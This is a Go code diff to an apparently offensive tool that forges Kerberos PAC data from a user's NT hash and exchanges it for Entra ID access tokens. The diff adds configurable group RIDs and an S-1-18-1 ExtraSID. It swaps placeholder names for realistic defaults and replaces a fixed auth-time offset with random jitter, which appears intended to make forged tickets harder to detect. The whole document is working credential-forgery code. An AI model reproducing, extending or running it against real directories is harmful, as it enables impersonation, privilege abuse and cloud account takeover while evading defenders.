@@ -7,7 +7,9 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"math/rand"
 	"os"
+	"runtime"
 	"strings"
 	"time"
 
@@ -31,6 +33,10 @@ func main() {
 		pacFile  = flag.String("pac-file", "", "Pre-built PAC binary file (skips PAC builder)")
 		machID   = flag.String("machine-id", "", "Machine ID binary file for TokenRestrictions")
 		kerbLoc  = flag.String("kerb-local", "", "KerbLocal binary file for auth-data Entry 2")
+		servName = flag.String("server-name", "", "PAC server name (default: derived from realm)")
+		dispName = flag.String("display-name", "", "PAC display name (default: UPN username)")
+		groups   = flag.String("groups", "515,527", "PAC group RIDs (comma-separated)")
+		extraSID = flag.Bool("extra-sid", true, "Include S-1-18-1 ExtraSID in PAC")
 		tenantID = flag.String("tenant-id", "", "Entra ID tenant ID (auto-discovered if empty)")
 		resource = flag.String("resource", "https://graph.windows.net", "Target resource URL")
 		clientID = flag.String("client-id", exchange.DefaultClientID, "OAuth2 client ID")
@@ -166,13 +172,19 @@ func main() {
 			DomainFQDN:    *domain,
 			Realm:         *realm,
 			UPN:           *upn,
-			FullName:      "DisplayName",
-			ServerName:    "DC1.company.com",
+			FullName:      displayNameOrDefault(*dispName, userName),
+			ServerName:    serverNameOrDefault(*servName, netBIOS),
 			NTHash:        key,
 		}
+		if *groups != "" {
+			params.GroupRIDs = parseRIDs(*groups)
+		}
 		pacBuilder := pac.NewBuilder(params)
+		if !*extraSID {
+			pacBuilder.DisableExtraSID()
+		}
 		now := time.Now().UTC().Truncate(time.Second)
-		authTimeFT = uint64(now.Add(-43 * time.Second).UnixNano()/100 + 116444736000000000)
+		authTimeFT = randomizedAuthTimeFT(now)
 		pacBuilder.SetAuthTime(authTimeFT)
 		var err error
 		pacBytes, err = pacBuilder.Build()
@@ -263,6 +275,9 @@ func main() {
 	}
 
 	// 7. Output
+	// Zero key material
+	for i := range key { key[i] = 0 }
+	runtime.GC()
 	switch *output {
 	case "token":
 		fmt.Println(token.AccessToken)
@@ -286,6 +301,33 @@ func main() {
 		fmt.Fprintf(os.Stderr, "unknown output: %s\n", *output)
 		os.Exit(1)
 	}
+}
+
+func serverNameOrDefault(explicit, netBIOS string) string {
+	if explicit != "" { return explicit }
+	return netBIOS
+}
+
+func displayNameOrDefault(explicit, userName string) string {
+	if explicit != "" { return explicit }
+	return userName
+}
+
+func randomizedAuthTimeFT(now time.Time) uint64 {
+	jitter := 30 + rand.Intn(60)
+	authTime := now.Add(-time.Duration(jitter) * time.Second)
+	return uint64(authTime.UnixNano()/100 + 116444736000000000)
+}
+
+func parseRIDs(s string) []uint32 {
+	parts := strings.Split(s, ",")
+	rids := make([]uint32, 0, len(parts))
+	for _, p := range parts {
+		var rid int64
+		fmt.Sscanf(strings.TrimSpace(p), "%d", &rid)
+		if rid > 0 { rids = append(rids, uint32(rid)) }
+	}
+	return rids
 }
 
 func parseRID(sid string) uint32 {
